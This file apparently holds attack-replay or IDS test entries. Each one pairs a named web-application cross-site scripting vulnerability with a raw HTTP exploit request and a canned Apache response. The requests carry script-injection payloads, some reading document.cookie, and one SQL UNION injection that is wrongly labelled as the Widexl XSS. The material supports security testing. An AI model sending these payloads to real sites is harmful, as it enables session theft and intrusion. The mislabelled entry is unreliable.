﻿tikiwiki_xss.xml,TikiWiki Cross-Site Scripting Vulnerability,allows an attacker to inject arbitrary javascript code which is then executed by the web server. TikiWiki is a web application that typically listens on port 80,HTTP,TCP,GET /tiki-lastchanges.php?days=3&offset=%22%3E%3Cscr%3Cscript%3Eipt%3Ealert('Blwood')%3C/scr%3C/script%3Eipt%3E HTTP/1.1||0D 0A ||Host||3A || www.victim.com||0D 0A ||User-Agent||3A || Links (2.1pre15||3B || Linux 2.6.15.6 i686||3B || 90x34)||0D 0A ||Accept||3A || */*||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
tikiwiki_xss.xml,TikiWiki Cross-Site Scripting Vulnerability,allows an attacker to inject arbitrary javascript code which is then executed by the web server. TikiWiki is a web application that typically listens on port 80,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿tinywebgallery_xss.xml,Tiny Web Gallery XSS vulnerability,This threat sends arbitrary web script or HTML via the twg_album parameter to be executed.Tiny Web Gallery is a web application that typically listens on port 80.,HTTP,TCP,GET /TinyWebGallery/index.php?twg_album=&'><script>alert(document.cookie)</script> HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Links (2.1pre15||3B || Linux 2.6.15.6 i686||3B || 90x34)||0D 0A ||Accept||3A || */*||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
tinywebgallery_xss.xml,Tiny Web Gallery XSS vulnerability,This threat sends arbitrary web script or HTML via the twg_album parameter to be executed.Tiny Web Gallery is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿ultimatehelpdesk_xss.xml,Ultimate HelpDesk Index.ASP Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains a malicious script which is then executed by the server. Ultimate HelpDesk is a web application that typically listens on port 80.,HTTP,TCP,GET /index.asp?status=open&page=tickets&title=39&searchparam=&u_input=&u_field=&intpage=2&keyword=%22%3E%3Cscript%3Ealert%28%27ajann%27%29%3B%3C%2Fscript%3E HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
ultimatehelpdesk_xss.xml,Ultimate HelpDesk Index.ASP Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains a malicious script which is then executed by the server. Ultimate HelpDesk is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿wbblog_xss.xml,WBBlog Cross Site Scripting Vulnerability,"This threat attempts to cause a cross site scripting condition through the Index.php function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. WBBlog is a web application, and typically listens on port 80.",HTTP,TCP,GET /index.php?cmd=viewentry&e_id=||22 ||><script>alert('HACKED')</script> HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
wbblog_xss.xml,WBBlog Cross Site Scripting Vulnerability,"This threat attempts to cause a cross site scripting condition through the Index.php function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. WBBlog is a web application, and typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿widexl_download_tracker_xss.xml,Widexl Download Tracker down.pl ID Variable XSS,This threat sends a crafted URL that contains Javascript which is included in the returned page. Widexl Download Tracker is a web based interface that typically listens on port 80.,HTTP,TCP,"POST /efiction/titles.php?action=viewlist&let='%20UNION%20SELECT%200,0,'<script>alert(document.cookie)</script>',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,penname,0%20FROM%20fanfiction_authors%20/* HTTP/1.0||0D 0A 0D 0A||"
widexl_download_tracker_xss.xml,Widexl Download Tracker down.pl ID Variable XSS,This threat sends a crafted URL that contains Javascript which is included in the returned page. Widexl Download Tracker is a web based interface that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
